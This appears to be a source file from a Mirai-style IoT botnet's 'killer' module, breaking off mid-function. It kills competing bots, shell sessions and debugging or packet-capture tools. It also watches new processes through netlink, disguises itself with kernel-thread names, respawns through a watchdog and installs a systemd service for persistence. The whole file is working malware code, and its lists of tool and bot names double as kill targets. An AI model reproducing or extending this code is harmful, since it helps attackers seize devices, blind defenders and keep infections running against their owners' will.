#define _GNU_SOURCE

#include "../../utils/headers/resolver.h"

#include "../../utils/headers/includes.h"
#include "../../utils/headers/util.h"

int sys_open(const char *pathname, int flags, int mode);
ssize_t sys_read(int fd, void *buf, size_t count);
int sys_close(int fd);
int sys_kill(int pid, int sig);
void itoa(int value, int base, char *str);
int NLMSG_LENGTH(int len);
int NLMSG_OK(void *nlh);
struct nlmsghdr *NLMSG_NEXT(void *nlh);
int sys_write(int fd, const void *buf, int count);
void sys_exit(int status);
void set_oom_protection(void);
void sys_signal(int signum, void (*handler)(int));
#include "../../utils/headers/rand.h"
#include "../../utils/headers/attack.h"
#include "../../utils/headers/protocols.h"
#include "../../utils/headers/checksum.h"

/* Missing function declarations */
int sys_stat(const char *pathname, struct stat *statbuf);
int sys_sched_setscheduler(pid_t pid, int policy, struct sched_param *param);
int sys_prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
int sys_execve(const char *pathname, char *const argv[], char *const envp[]);
int sys_setpriority(int which, int who, int prio);
int sys_access(const char *pathname, int mode);
int sys_readlink(char *path, char *buf, size_t bufsiz);
int sys_mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data);
int sys_getdents64(int fd, void *dirp, unsigned int count);
int sys_bind(int fd, void *addr, socklen_t addrlen);
int sys_getsockname(int fd, void *addr, socklen_t *addrlen);
int sys_gettimeofday(struct timeval *tv, void *tz);
int sys_sleep(int seconds);
int isdigit(int c);
int find_inode_by_port(uint16_t port);
int inject_into_init(char **argv);
int hollow_with_execve(char *path, char **argv);

#include "../../utils/headers/syscalls.h"
#include "../../encryption/chacha20_table.h"
#include "../../utils/headers/hollowing.h"
#include "../../utils/headers/memprotect.h"
#include "headers/killer.h"
#ifdef LOCKER
#include "headers/locker.h"
#endif
#include "../../encryption/chacha20_table.h"
#include "../debug.h"
#include "../../utils/headers/obfuscate.h"

#ifndef CLONE_NEWPID
#define CLONE_NEWPID 0x20000000
#endif

int killer_pid;
static pid_t main_bot_pid = 0;
static char **global_argv = NULL;
static char bot_path[256] = {0};
static ino_t self_inode = 0;
static dev_t self_device = 0;

static char wl_comm_encrypted[35][32] = {0};
static char *wl_comm_decrypted[41];
static int wl_comm_encrypted_state = 0;

static char *wl_comm[44];

static char *bot_dl[7];

static inline int is_own_pid(pid_t pid) {
    if (pid <= 1) return 1;
    if (pid == killer_pid || pid == main_bot_pid || pid == sys_getpid() || pid == sys_getppid()) return 1;
    char exepath[256] = {0}, xpath[128] = {0};
    sprintf(xpath, enc[PROC_PID_EXE].string, pid);
    ssize_t el = sys_readlink(xpath, exepath, sizeof(exepath)-1);
    if (el > 0) {
        exepath[el] = '\0';
        if (sys_strstr(exepath, enc[PROC_NAME_KWORKER_0_200].string) != NULL) return 1;
    }
    char commpath[128] = {0}, comm[64] = {0};
    sprintf(commpath, enc[PROC_PID_COMM].string, pid);
    int cfd = sys_open(commpath, O_RDONLY, 0);
    if (cfd >= 0) {
        sys_read(cfd, comm, sizeof(comm)-1); sys_close(cfd);
        if (sys_strstr(comm, enc[PROC_NAME_KWORKER_0_20].string) != NULL) return 1;
    }
    return 0;
}

static inline int exe_is_self(const char *exepath) {
    if (self_inode > 0) {
        struct stat st;
        if (sys_stat((char *)exepath, &st) == 0) if (st.st_ino == self_inode && st.st_dev == self_device) return 1;
    }
    return 0;
}


static inline int comm_is_whitelisted(const char *name) {
    for (int i = 0; wl_comm_decrypted[i] != NULL; i++) {
        if (strlen(wl_comm_decrypted[i]) == 0) continue;
        if (sys_strstr(name, wl_comm_decrypted[i])) return 1;
    }
    wl_comm_encrypted_state = 0;
    return 0;
}

static inline int is_bot_downloader(const char *cmdline) {
    for (int i = 0; bot_dl[i] != 0; i++) {
        if (sys_strstr(cmdline, bot_dl[i])) return 1;
    }
    return 0;
}

static void killer_init(void) {
    int i = 0;
    wl_comm_decrypted[i++] = enc[PROC_NAME_INIT].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_SYSTEMD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KTHREADD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KSOFTIRQD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_MIGRATION].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_RCU].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KSWAPD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KHELPER].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KDEVTMPFS].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_NETNS].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KAUDITD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KHUNGTASKD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_OOM_REAPER].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_WRITEBACK].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KCOMPACTD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KSMD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KHUGEPAGED].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_WATCHDOG].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_WATCHDOGD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KINTEGRITYD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_SYNC_SUPERS].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KBLOCKD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_ATA].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_KHUBD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_SCSI].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_USB_STORAGE].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_BASH].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_SH].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_DROPBEAR].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_TMUX].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_SCREEN].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_DBUS_DAEMON].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_AGETTY].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_RSYSLOGD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_ATD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_NETWORKMANAGER].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_UDEVD].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_SYSTEMD_HELPER].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_ADB].string;
    wl_comm_decrypted[i++] = enc[PROC_NAME_ADBD].string;
    wl_comm_decrypted[i++] = NULL;

    i = 0;
    bot_dl[i++] = enc[TOOL_WGET].string;
    bot_dl[i++] = enc[TOOL_CURL].string;
    bot_dl[i++] = enc[TOOL_NC].string;
    bot_dl[i++] = enc[TOOL_NETCAT].string;
    bot_dl[i++] = enc[TOOL_FTPGET].string;
    bot_dl[i++] = enc[TOOL_TFTP].string;
    bot_dl[i++] = NULL;

    i = 0;
    wl_comm[i++] = enc[PROC_NAME_INIT].string;
    wl_comm[i++] = enc[PROC_NAME_SYSTEMD].string;
    wl_comm[i++] = enc[PROC_NAME_KTHREADD].string;
    wl_comm[i++] = enc[PROC_NAME_KSOFTIRQD].string;
    wl_comm[i++] = enc[PROC_NAME_MIGRATION].string;
    wl_comm[i++] = enc[PROC_NAME_RCU].string;
    wl_comm[i++] = enc[PROC_NAME_KSWAPD].string;
    wl_comm[i++] = enc[PROC_NAME_KHELPER].string;
    wl_comm[i++] = enc[PROC_NAME_KDEVTMPFS].string;
    wl_comm[i++] = enc[PROC_NAME_NETNS].string;
    wl_comm[i++] = enc[PROC_NAME_KAUDITD].string;
    wl_comm[i++] = enc[PROC_NAME_KHUNGTASKD].string;
    wl_comm[i++] = enc[PROC_NAME_OOM_REAPER].string;
    wl_comm[i++] = enc[PROC_NAME_WRITEBACK].string;
    wl_comm[i++] = enc[PROC_NAME_KCOMPACTD].string;
    wl_comm[i++] = enc[PROC_NAME_KSMD].string;
    wl_comm[i++] = enc[PROC_NAME_KHUGEPAGED].string;
    wl_comm[i++] = enc[PROC_NAME_WATCHDOG].string;
    wl_comm[i++] = enc[PROC_NAME_WATCHDOGD].string;
    wl_comm[i++] = enc[PROC_NAME_KINTEGRITYD].string;
    wl_comm[i++] = enc[PROC_NAME_SYNC_SUPERS].string;
    wl_comm[i++] = enc[PROC_NAME_KBLOCKD].string;
    wl_comm[i++] = enc[PROC_NAME_ATA].string;
    wl_comm[i++] = enc[PROC_NAME_KHUBD].string;
    wl_comm[i++] = enc[PROC_NAME_SCSI].string;
    wl_comm[i++] = enc[PROC_NAME_USB_STORAGE].string;
    wl_comm[i++] = enc[PROC_NAME_BASH].string;
    wl_comm[i++] = enc[PROC_NAME_SH].string;
    wl_comm[i++] = enc[PROC_NAME_DROPBEAR].string;
    wl_comm[i++] = enc[PROC_NAME_TMUX].string;
    wl_comm[i++] = enc[PROC_NAME_SCREEN].string;
    wl_comm[i++] = enc[PROC_NAME_DBUS_DAEMON].string;
    wl_comm[i++] = enc[PROC_NAME_AGETTY].string;
    wl_comm[i++] = enc[PROC_NAME_RSYSLOGD].string;
    wl_comm[i++] = enc[PROC_NAME_ATD].string;
    wl_comm[i++] = enc[PROC_NAME_NETWORKMANAGER].string;
    wl_comm[i++] = enc[PROC_NAME_UDEVD].string;
    wl_comm[i++] = enc[PROC_NAME_SYSTEMD_HELPER].string;
    wl_comm[i++] = enc[PROC_NAME_ADB].string;
    wl_comm[i++] = enc[PROC_NAME_ADBD].string;
    wl_comm[i++] = NULL;
}

struct linux_dirent64 {
    uint64_t        d_ino;
    int64_t         d_off;
    unsigned short  d_reclen;
    unsigned char   d_type;
    char            d_name[];
};

void killer_kill_bash_sh_once(void) {
    int fd = sys_open(enc[PROC_DIR].string, O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0) return;

    char buf[4096];
    int nread;

    while ((nread = sys_getdents64(fd, buf, sizeof(buf))) > 0) {
        int bpos;
        for (bpos = 0; bpos < nread; ) {
            struct linux_dirent64 *entry = (struct linux_dirent64 *)(buf + bpos);
            char *name = entry->d_name;

            if (*name >= '0' && *name <= '9') {
                int pid = atoi(name);
                if (!is_own_pid(pid)) {
                    char commpath[128] = {0}, comm[64] = {0};
                    sprintf(commpath, enc[PROC_PID_COMM].string, pid);
                    int cfd = sys_open(commpath, O_RDONLY, 0);
                    if (cfd >= 0) {
                        sys_read(cfd, comm, sizeof(comm) - 1);
                        sys_close(cfd);
                        char *nl = sys_strstr(comm, "\n");
                        if (nl) *nl = '\0';

                        if (strcmp(comm, "bash") == 0 || strcmp(comm, "sh") == 0) {
                            sys_kill(pid, 9);
                        }
                    }
                }
            }
            bpos += entry->d_reclen;
        }
    }
    sys_close(fd);
}


static inline int is_suspicious_process(const char *exepath, const char *comm, const char *cmdline) {

    if (!exepath && !comm) return 0;
    
    const char *suspicious_paths[] = {
        enc[TMP_DIR].string, enc[VAR_TMP_DIR].string, enc[DEV_SHM_DIR].string, enc[RUN_SHM_DIR].string,
        enc[TMP_DOT].string, enc[VAR_TMP_DOT].string, enc[DEV_SHM_DOT].string, enc[RUN_SHM_DOT].string,
        NULL
    };
    
    const char *mirai_names[] = {
        enc[BOT_MIRAI].string, enc[BOT_SORA].string, enc[BOT_TSUNAMI].string, enc[BOT_GAFGYT].string, enc[BOT_QBOT].string, enc[BOT_BASHLITE].string,
        enc[BOT_XENON].string, enc[BOT_HYDRA].string, enc[BOT_PNS].string, enc[BOT_DOFLOO].string, enc[BOT_IRCBOT].string,
        NULL
    };
    
    const char *suspicious_patterns[] = {
        enc[TOOL_BUSYBOX].string, enc[TOOL_NC].string, enc[TOOL_NETCAT].string, enc[TOOL_TFTP].string, enc[TOOL_WGET].string, enc[TOOL_CURL].string,
        enc[TOOL_CHMOD].string, enc[TOOL_CHATTR].string, enc[TOOL_IPTABLES].string, enc[TOOL_SERVICE].string,
        enc[TOOL_SH_C].string, enc[TOOL_BASH_C].string, enc[BIN_SH].string, enc[BIN_BASH].string,
        enc[TOOL_STRACE].string, enc[TOOL_LTRACE].string, enc[TOOL_GDB].string, enc[TOOL_LLDB].string, enc[TOOL_VALGRIND].string,
        enc[TOOL_RADARE2].string, enc[TOOL_R2].string, enc[TOOL_IDA].string, enc[TOOL_IDA64].string, enc[TOOL_X64DBG].string,
        enc[TOOL_EDB].string, enc[TOOL_WINDBG].string, enc[TOOL_OLLYDBG].string, enc[TOOL_IMMUNITY].string, enc[TOOL_WIRESHARK].string,
        enc[TOOL_TCPDUMP].string, enc[TOOL_TSHARK].string, enc[TOOL_NGREP].string, enc[TOOL_ETTERCAP].string,
        NULL
    };
    
    if (exepath) {
        for (int i = 0; suspicious_paths[i] != NULL; i++) {
            if (sys_strstr(exepath, suspicious_paths[i])) return 1;
        }
        
        for (int i = 0; mirai_names[i] != NULL; i++) {
            if (sys_strstr(exepath, mirai_names[i])) return 1;
        }
        
        for (int i = 0; suspicious_patterns[i] != NULL; i++) {
            if (sys_strstr(exepath, suspicious_patterns[i])) return 1;
        }
        
        if (sys_strstr(exepath, enc[SIG_UPX_NAME].string)) return 1;
    }
    
    if (comm) {
        for (int i = 0; mirai_names[i] != NULL; i++) {
            if (sys_strstr(comm, mirai_names[i])) return 1;
        }
        
        for (int i = 0; suspicious_patterns[i] != NULL; i++) {
            if (sys_strstr(comm, suspicious_patterns[i])) return 1;
        }
        
        if (sys_strstr(comm, enc[SIG_UPX_NAME].string)) return 1;
    }

    
    if (cmdline) {
        for (int i = 0; suspicious_patterns[i] != NULL; i++) {
            if (sys_strstr(cmdline, suspicious_patterns[i])) return 1;
        }
        
        for (int i = 0; mirai_names[i] != NULL; i++) {
            if (sys_strstr(cmdline, mirai_names[i])) return 1;
        }
    }
    
    return 0;
}

static int has_bot_signatures(int pid) {
    char path[64];
    sprintf(path, enc[PROC_PID_EXE].string, pid);
    int fd = sys_open(path, 0, 0);
    if (fd < 0) return 0;

    uint8_t buf[4096];
    int n = sys_read(fd, buf, sizeof(buf));
    sys_close(fd);
    if (n <= 0) return 0;

    EncryptionTable sigs[] = {
        SIG_MIRAI_1, SIG_MIRAI_2, SIG_QBOT_1, SIG_QBOT_2,
        SIG_GENERIC_1, SIG_GENERIC_2, SIG_GENERIC_3, SIG_GENERIC_4, SIG_GENERIC_5,
        SIG_ALPHABET, SIG_ALPHABET_UPPER, SIG_NUMBERS,
        SIG_PROC_SELF_EXE, SIG_PROC_SELF_CMDLINE, SIG_PROC_NET_TCP_STR, SIG_PROC_NET_UDP_STR, SIG_DEV_NULL_STR,
        SIG_UPX_NAME, SIG_UPX_MAGIC
    };

    for (int i = 0; i < sizeof(sigs)/sizeof(sigs[0]); i++) {
        char *pattern = enc[sigs[i]].string;
        int plen = (int)strlen(pattern);
        if (plen <= 0) continue;
        for (int j = 0; j <= n - plen; j++) {
            if (memcmp(buf + j, pattern, plen) == 0) return 1;
        }
    }
    return 0;
}

static inline void read_cmdline(int pid, char *buf, size_t len) {
    char path[64];
    sprintf(path, enc[PROC_PID_CMDLINE].string, pid);
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd >= 0) {
        sys_read(fd, buf, len);
        sys_close(fd);
    }
}




static void nuke_scan(void) {
    int fd = sys_open(enc[PROC_DIR].string, O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0) return;

    uint8_t d_buf[16384];
    int nread;
    int check_count = 0;

    while ((nread = sys_getdents64(fd, d_buf, sizeof(d_buf))) > 0) {
        int bpos;
        for (bpos = 0; bpos < nread; ) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)(d_buf + bpos);
            char *pid_str = d->d_name;

            if (isdigit(pid_str[0])) {
                int pid = atoi(pid_str);
                if (!is_own_pid(pid)) {
                    if (rand_next() % 7 == 0) sys_usleep(rand_next() % 500);

                    char exepath[256] = {0}, xpath[128] = {0};
                    strcpy(xpath, enc[PROC_DIR].string); strcat(xpath, pid_str); strcat(xpath, enc[KILLER_EXE].string);
                    ssize_t el = sys_readlink(xpath, exepath, sizeof(exepath)-1);
                    if (el > 0) { exepath[el] = '\0'; char *dp = sys_strstr(exepath, enc[DELETED_SUFFIX].string); if (dp) *dp = '\0'; }

                    if (!(el > 0 && exe_is_self(exepath)) && !(el > 0 && comm_is_whitelisted(exepath))) {
                        char statpath[128] = {0}; strcpy(statpath, enc[PROC_DIR].string); strcat(statpath, pid_str); strcat(statpath, enc[KILLER_STATS].string);
                        char statbuf[256] = {0}; int sfd = sys_open(statpath, O_RDONLY, 0);
                        if (sfd >= 0) { sys_read(sfd, statbuf, sizeof(statbuf)-1); sys_close(sfd); }

                        char comm[64] = {0}; char *lp = sys_strstr(statbuf, enc[LEFT_PAREN].string), *rp = sys_strstr(statbuf, enc[RIGHT_PAREN].string);
                        if (lp && rp && rp > lp) { int clen = (int)(rp - lp - 1); if (clen > 63) clen = 63; memcpy(comm, lp+1, clen); comm[clen] = '\0'; }

                        if (!(comm[0] && comm_is_whitelisted(comm))) {
                            char cmdline[512] = {0}; read_cmdline(pid, cmdline, sizeof(cmdline));
                            if (!is_bot_downloader(cmdline)) {
                                if (is_suspicious_process(el > 0 ? exepath : NULL, comm, cmdline) || has_bot_signatures(pid)) {
                                    if (sys_kill(pid, SIGKILL) == 0) {
                                        #ifdef DEBUG
                                        debug("[killer] killed: %s (PID: %d)\n", el > 0 ? exepath : comm, pid);
                                        #endif
                                        sys_usleep(rand_next() % 1000);
                                    }
                                }
                            }
                        }
                    }
                    check_count++;
                    if (check_count % 11 == 0) sys_usleep(rand_next() % 2000);
                }

            }
            bpos += d->d_reclen;
        }
    }
    sys_close(fd);
}

static inline int stealth_pid_exists(pid_t pid) {
    char path[64];
    sprintf(path, enc[MSG_PROC_PID_FMT].string, enc[PROC_DIR].string, (int)pid);
    return sys_access(path, 0) == 0;
}

static void stealth_hidden_scan(void) {
    static int last_max_pid = 32768;
    static int scan_direction = 1;
    static pid_t last_scanned = 1;

    int max_pid = last_max_pid;
    int mfd = sys_open(enc[PROC_SYS_KERNEL_PID_MAX].string, O_RDONLY, 0);
    if (mfd >= 0) {
        char buf[16] = {0};
        sys_read(mfd, buf, sizeof(buf)-1);
        sys_close(mfd);
        max_pid = atoi(buf);
        if (max_pid > 0 && max_pid < 4194304) last_max_pid = max_pid;
    }

    int scan_count = 50 + (rand_next() % 50);
    int step = 7 + (rand_next() % 13);

    sys_usleep(rand_next() % 3000);

    for (int i = 0; i < scan_count; i++) {
        if (rand_next() % 5 == 0) sys_usleep(rand_next() % 200);

        if (scan_direction) {
            last_scanned += step;
            if (last_scanned >= max_pid) {
                last_scanned = 1;
                scan_direction = 0;
            }
        } else {
            last_scanned -= step;
            if (last_scanned <= 1) {
                last_scanned = max_pid;
                scan_direction = 1;
            }
        }

        if (is_own_pid(last_scanned)) continue;

        if (stealth_pid_exists(last_scanned)) {
            char exepath[256] = {0}, xpath[128] = {0};
            char pid_str[16]; itoa(last_scanned, 10, pid_str);
            strcpy(xpath, enc[PROC_DIR].string); strcat(xpath, pid_str); strcat(xpath, enc[KILLER_EXE].string);
            ssize_t el = sys_readlink(xpath, exepath, sizeof(exepath)-1);
            
            if (el > 0) {
                exepath[el] = '\0';
                char *dp = sys_strstr(exepath, enc[DELETED_SUFFIX].string);
                if (dp) *dp = '\0';
                if (exe_is_self(exepath) || comm_is_whitelisted(exepath)) continue;
            }

            char commpath[128] = {0}, comm[64] = {0};
            sprintf(commpath, enc[PROC_PID_COMM].string, (int)last_scanned);
            int cfd = sys_open(commpath, O_RDONLY, 0);
            if (cfd >= 0) {
                sys_read(cfd, comm, sizeof(comm)-1);
                sys_close(cfd);
                char *nl = sys_strstr(comm, "\n");
                if (nl) *nl = '\0';
                if (comm_is_whitelisted(comm)) continue;
            }

            char cmdline[512] = {0};
            read_cmdline(last_scanned, cmdline, sizeof(cmdline));
            if (is_bot_downloader(cmdline)) continue;

            if (is_suspicious_process(el > 0 ? exepath : NULL, comm, cmdline)) {
                if (sys_kill(last_scanned, 9) == 0) {
                    #ifdef DEBUG
                    debug("[killer][stealth] killed: %s (PID: %d)\n", el > 0 ? exepath : comm, last_scanned);
                    #endif
                    sys_usleep(rand_next() % 1500);
                }
            }
        }

        if (rand_next() % 8 == 0) sys_usleep(rand_next() % 3000);
    }
}

static void memory_map_scan(pid_t pid) {
    if (rand_next() % 3 == 0) sys_usleep(rand_next() % 100);

    char maps_path[64];
    sprintf(maps_path, enc[PROC_PID_MAPS].string, pid);
    int fd = sys_open(maps_path, O_RDONLY, 0);
    if (fd < 0) return;

    char buf[4096];
    int bytes_read = sys_read(fd, buf, sizeof(buf)-1);
    sys_close(fd);
    if (bytes_read <= 0) return;
    buf[bytes_read] = '\0';


    char *suspicious_patterns[] = {
        enc[ELF_MAGIC].string,
        enc[RWXP_PATTERN].string,
        enc[HEAP_PATTERN].string,
        enc[STACK_PATTERN].string,
        enc[NOP_SLIDE].string,
        NULL
    };

    for (int i = 0; suspicious_patterns[i] != NULL; i++) {
        if (sys_strstr(buf, suspicious_patterns[i])) {
            #ifdef DEBUG
            debug("[killer][memscan] suspicious pattern in PID %d\n", pid);
            #endif
            break;
        }
    }

    if (rand_next() % 5 == 0) sys_usleep(rand_next() % 500);
}

static void enhanced_stealth_scan(void) {
    static int scan_phase = 0;
    static int stealth_counter = 0;

    stealth_counter++;

    int base_delay = rand_next() % 1000;
    sys_usleep(base_delay);

    if (stealth_counter % 3 == 0) {
        nuke_scan();
    }

    if (stealth_counter % 7 == 0) {
        stealth_hidden_scan();
    }

    if (stealth_counter % 13 == 0) {
        DIR *dir = sys_opendir(enc[PROC_DIR].string);
        if (dir) {
            struct dirent *ent;
            int check_count = 5 + (rand_next() % 10);
            int checked = 0;
            while ((ent = sys_readdir(dir)) && checked < check_count) {
                if (isdigit(ent->d_name[0])) {
                    int pid = atoi(ent->d_name);
                    if (!is_own_pid(pid) && stealth_pid_exists(pid)) {
                        memory_map_scan(pid);
                        checked++;
                        if (rand_next() % 3 == 0) sys_usleep(rand_next() % 200);
                    }
                }
            }
            sys_closedir(dir);
        }
    }

    int jitter = (rand_next() % 3000) - 1500;
    if (jitter > 0) sys_usleep(jitter);
}

static int nl_connect(void) {
    int fd;
    struct sockaddr_nl sa;
    struct nlmsghdr *nlh;
    struct cn_msg *m;
    enum proc_cn_mcast_op *op;
    uint64_t buf[16]; // 128 bytes, 8-byte aligned

    fd = sys_socket(16 /*PF_NETLINK*/, 2 /*SOCK_DGRAM*/, 11 /*NETLINK_CONNECTOR*/);
    if (fd == -1) return -1;

    sa.nl_family = AF_NETLINK;
    sa.nl_groups = CN_IDX_PROC;
    sa.nl_pid = sys_getpid();

    if (sys_bind(fd, (void *)&sa, sizeof(sa)) == -1) { 
        #ifdef DEBUG
        debug("[killer][nl] bind failed\n");
        #endif
        sys_close(fd); return -1; 
    }

    memset(buf, 0, sizeof(buf));
    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct cn_msg) + sizeof(enum proc_cn_mcast_op));
    nlh->nlmsg_type = NLMSG_DONE;
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = sys_getpid();

    m = (struct cn_msg *)NLMSG_DATA(nlh);
    m->id.idx = CN_IDX_PROC;
    m->id.val = CN_VAL_PROC;
    m->seq = 0;
    m->ack = 0;
    m->len = sizeof(enum proc_cn_mcast_op);

    op = (enum proc_cn_mcast_op *)m->data;
    *op = PROC_CN_MCAST_LISTEN;

    if (sys_sendto(fd, nlh, nlh->nlmsg_len, 0, NULL, 0) == -1) { 
        #ifdef DEBUG
        debug("[killer][nl] send failed\n");
        #endif
        sys_close(fd); return -1; 
    }

    #ifdef DEBUG
    debug("[killer][nl] connected to netlink socket\n");
    #endif

    return fd;
}

static void nl_handle_event(int fd) {
    uint64_t buf[128]; // 1024 bytes, 8-byte aligned
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    ssize_t len = sys_recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL);
    if (len <= 0) return;

    if (rand_next() % 5 == 0) sys_usleep(rand_next() % 500);

    for (; NLMSG_OK(nlh); nlh = NLMSG_NEXT(nlh)) {
        if (nlh->nlmsg_type == NLMSG_ERROR || nlh->nlmsg_type == NLMSG_NOOP) continue;

        if (rand_next() % 7 == 0) sys_usleep(rand_next() % 200);

        struct cn_msg *m = (struct cn_msg *)NLMSG_DATA(nlh);
        if (m->id.idx != CN_IDX_PROC || m->id.val != CN_VAL_PROC) continue;

        struct proc_event ev;
        if (m->len < sizeof(struct proc_event)) continue;
        memcpy(&ev, m->data, sizeof(struct proc_event));

        int target_pid = 0;

        if (ev.what == PROC_EVENT_FORK) target_pid = ev.event_data.fork.child_pid;
        else if (ev.what == PROC_EVENT_EXEC) target_pid = ev.event_data.exec.process_pid;

        #ifdef DEBUG
        debug("[killer][nl] event: %d for PID: %d\n", ev.what, target_pid);
        #endif

        if (target_pid > 0 && !is_own_pid(target_pid)) {
            if (rand_next() % 3 == 0) sys_usleep(rand_next() % 300);

            char exepath[256] = {0}, xpath[128] = {0};
            sprintf(xpath, enc[PROC_PID_EXE].string, target_pid);
            ssize_t el = sys_readlink(xpath, exepath, sizeof(exepath)-1);
            if (el > 0) {
                exepath[el] = '\0';
                char *dp = sys_strstr(exepath, enc[DELETED_SUFFIX].string); if (dp) *dp = '\0';
                if (exe_is_self(exepath) || comm_is_whitelisted(exepath)) continue;
            }

            char commpath[128] = {0}, comm[64] = {0};
            sprintf(commpath, enc[PROC_PID_COMM].string, target_pid);

            int cfd = sys_open(commpath, O_RDONLY, 0);
            if (cfd >= 0) {
                sys_read(cfd, comm, sizeof(comm)-1); sys_close(cfd);

                char *nl = sys_strstr(comm, enc[NEWLINE_STR].string); if (nl) *nl = '\0';
                if (comm_is_whitelisted(comm)) continue;
            }

            if (sys_kill(target_pid, SIGKILL) == 0) {
                #ifdef DEBUG
                debug("[killer][nl] killed (heuristic): %s (PID: %d)\n", el > 0 ? exepath : comm, target_pid);
                #endif
                sys_usleep(rand_next() % 1000);
            } else if (has_bot_signatures(target_pid)) {
                if (sys_kill(target_pid, SIGKILL) == 0) {
                    #ifdef DEBUG
                    debug("[killer][nl] killed (signature): %d\n", target_pid);
                    #endif
                }
            }
        }
    }
}

char check_whitelisted(char *name) {
    return (char)comm_is_whitelisted(name);
}

char *check_realpath(char *pid, char *path, int n) {
    char xpath[128] = {0};
    strcpy(xpath, enc[PROC_DIR].string);
    strcat(xpath, pid);
    strcat(xpath, enc[KILLER_EXE].string);

    ssize_t el = sys_readlink(xpath, path, 255);
    if (el > 0) {
        path[el] = '\0';
        char *dp = sys_strstr(path, enc[DELETED_SUFFIX].string);
        if (dp) *dp = '\0';
        
        if (n && (exe_is_self(path) || comm_is_whitelisted(path))) return NULL;
        return path;
    }
    return NULL;
}

static inline void check_tracer(int pid) { return; }

static void anti_debug_scan(void) { return; }

static void anti_detection_evasion(void) {
    static int evasion_counter = 0;
    evasion_counter++;

    if (evasion_counter % 17 == 0) {
        char new_name[32];
        memset(new_name, 0, sizeof(new_name));
        int name_variant = (evasion_counter / 17) % 5;
        switch (name_variant) {
            case 0: strcpy(new_name, enc[PROC_NAME_KWORKER_0_2].string); break;
            case 1: strcpy(new_name, enc[PROC_NAME_KWORKER_U2_0].string); break;
            case 2: strcpy(new_name, enc[PROC_NAME_KWORKER_0_0H].string); break;
            case 3: strcpy(new_name, enc[PROC_NAME_KSOFTIRQD_0].string); break;
            case 4: strcpy(new_name, enc[PROC_NAME_RCU_SCHED].string); break;
        }
        sys_prctl(15 /*PR_SET_NAME*/, (unsigned long)new_name, 0, 0, 0);
    }

    if (evasion_counter % 23 == 0) {
        int dummy_fd = sys_open(enc[DEV_NULL].string, O_RDONLY, 0);
        if (dummy_fd >= 0) {
            sys_close(dummy_fd);
        }
    }

    if (evasion_counter % 31 == 0) {
        sys_getppid();
    }
}

void killer_destroy(void) {
    if (killer_pid > 0) sys_kill(killer_pid, SIGKILL);
}

static void killer_watchdog(char **argv) {
    while (1) {
        if (killer_pid > 0 && sys_kill(killer_pid, 0) == -1) {
            #ifdef DEBUG
            debug("[killer][watchdog] Killer died! Respawning...\n");
            #endif
            killer_create(argv);
        }
        sys_usleep(500000); // Check every 500ms
    }
}

static int install_systemd_service(const char *bot_path) {
    (void)0;
    
    char service_path[128];
    sprintf(service_path, enc[TADASHI_SERVICE_PATH].string);
    
    int fd = sys_open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -1;
    
    char buf[4096];
    sprintf(buf, enc[SERVICE_CONTENT].string, bot_path);
    sys_write(fd, buf, strlen(buf));
    sys_close(fd);
    
    pid_t pid = sys_fork();
    if (pid == 0) {
        char *args[] = {enc[USR_BIN_SYSTEMCTL].string, enc[CMD_DAEMON_RELOAD].string, NULL};
        sys_execve(enc[USR_BIN_SYSTEMCTL].string, args, NULL);
        sys_exit(0);
    }
    
    pid = sys_fork();
    if (pid == 0) {
        char *args[] = {enc[USR_BIN_SYSTEMCTL].string, enc[CMD_ENABLE].string, enc[TADASHI_SERVICE_NAME].string, NULL};
        sys_execve(enc[USR_BIN_SYSTEMCTL].string, args, NULL);
        sys_exit(0);
    }
    
    pid = sys_fork();
    if (pid == 0) {
        char *args[] = {enc[USR_BIN_SYSTEMCTL].string, enc[CMD_START].string, enc[TADASHI_SERVICE_NAME].string, NULL};
